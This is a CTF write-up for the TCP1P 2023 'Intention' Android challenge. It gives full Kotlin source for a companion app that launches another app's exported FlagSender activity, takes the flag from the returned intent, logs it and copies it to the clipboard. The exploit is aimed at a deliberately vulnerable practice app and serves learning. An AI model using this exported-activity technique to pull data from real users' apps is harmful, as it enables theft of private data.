---
title: "TCP1P CTF 2023"
date: 2023-10-17T08:53:58+02:00
draft: true
categories: ctf
---

# TCP1P CTF 2023
Write-ups for [TCP1P](https://ctf.tcp1p.com/) CTF 2023.
- [Challenges](#challenges)
  - [Intention](#intention)

## Challenges
### Intention

| **Category** | **Points** | **Solves** |
|:------------:|:----------:|:----------:|
|   Mobile  |      356     |     13     |

#### Challenge Description
<figure>
  <img src="/assets/tcp1p_intention_description.png" alt="intention description" style="width:60%">
  <figcaption></figcaption>
</figure>

#### Approach

The challenge presents an interesting setup compared to regular mobile challenges: we are asked to create a malicious app that exploits it inside an emulator, great idea!

The application has two activities: MainActivity, where nothing happens, and a FlagSender, where the content of `flag.txt` file is set as an intent result and sent back to the caller. The AndroidManifest.xml also suggests what should be the approach of exploiting this challenge: FlagSender activity is exported, so we are able to start it from an external application, and retrieve the intent result (set with `setResult(-1, getIntent().putExtra("flag", flag));`). We have everything we need in theory, but we need to create a malicious application to install in the emulator in order to exploit it.

I decided to use Android new approach to development: Kotlin and Jetpack Compose because it is a bit different (more on that in future blog posts). The idea is the following:
1. create an activity with a button that redirects the user to the FlagSender activity
2. prepare a listener on the result received when the FlagSender activity is closed
3. catch the result, parse the result code and get the data
4. display the data in the app (or in my case, copy it to the clipboard)

The following code is what is necessary in the malicious application to work properly.

**MainActivity.kt**

```Kotlin

package com.example.intention_solve1

import android.R.attr.label
import android.R.attr.text
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Button
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import com.example.intention_solve1.ui.theme.Intention_solve1Theme


class MainActivity : ComponentActivity() {

    private lateinit var flagSenderLauncher: ActivityResultLauncher<Intent>

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        flagSenderLauncher = registerForActivityResult(ActivityResultContracts
            .StartActivityForResult()) { result ->
            if (result.resultCode == -1) {
                val resultString = result.data?.getStringExtra("flag")
                Log.e("FLAG", resultString ?: "CANT GET FLAG")


                copyToClipboard(resultString?:"")
            } else if (result.resultCode == RESULT_CANCELED) {
                Log.e("ERROR", "RESULT CANCELED")
            }
        }

        setContent {
            Intention_solve1Theme {
                // A surface container using the 'background' color from the theme

                var resultString by remember {
                    mutableStateOf("")
                }
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    Column(
                        modifier = Modifier
                            .fillMaxSize()
                            .padding(16.dp),
                        verticalArrangement = Arrangement.Center,
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        Button(
                            onClick = {
                                launchFlagSenderActivity()
                            }
                        ) {
                            Text("Open FlagSender Activity")
                        }
                    }
                }
            }
        }
    }

    private fun copyToClipboard(text: String) {
        val clipboardManager: ClipboardManager =
            getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clipData = ClipData.newPlainText("Flag", text)
        clipboardManager.setPrimaryClip(clipData)
        Log.e("Clipboard", "Text copied to clipboard: $text")
    }

    private fun launchFlagSenderActivity() {
        val targetPackageName = "com.kuro.intention"

        if (isAppInstalled(targetPackageName)) {
            val intent = Intent().apply {
                component = ComponentName(targetPackageName, 
                "com.kuro.intention.FlagSender")
            }
            flagSenderLauncher.launch(intent)
        } else {
            Log.e("ERROR", "APP NOT INSTALLED")
        }
    }

    private fun isAppInstalled(packageName: String): Boolean {
        val packageManager: PackageManager = packageManager
        val intent = packageManager.getLaunchIntentForPackage(packageName)
        return intent != null
    }
}


```

The most interesting part is the `flagSenderLauncher`, a component used to register the result value of the activity called, so that we are able to parse it. If you are unfamiliar with Jetpack Compose, we use `setContent` to declare our UI, instead of using XML and retrieving its component. The `onClick` method is associated to `launchFlagSenderActivity()`, which controls that the app is installed and opens it. `copyToClipboard()` is used to copy the result data into the clipboard. I decided to use this approach because the emulator has an easy way to share the clipboard with our laptop.

We also need to add a `<queries>` tag in the AndroidManifest of our application when working with Android 11 or later, to be able to call the challenge application (see [this](https://developer.android.com/training/package-visibility/declaring) article for more details).

**AndroidManifest.xml**
```xml
...
    </application>
    <queries>
        <package android:name="com.kuro.intention" />
    </queries>
</manifest>
```

The final result is shown in the image below: the flag is saved in the clipboard, so we are able to copy it easily!

<figure styple="text-align:left">
  <img src="/assets/tcp1p_intention_result.png" alt="intention result" style="width:60%" >
  <figcaption>The flag is shown in the device clipboard</figcaption>
</figure>

#### Reflection
It was an interesting challenge, and it was the first one I solved that required developing an app. I struggled a bit in designing the app because it was new to me, but I learned a lot! I am also fascinated by the architecture of the challenge, using a container and an emulator that we can interact with using the browser 😍

# Credits <!-- omit from toc -->
This template was based on [RyanNgCT/CTF-Writeup-Template](https://github.com/RyanNgCT/CTF-Writeup-Template)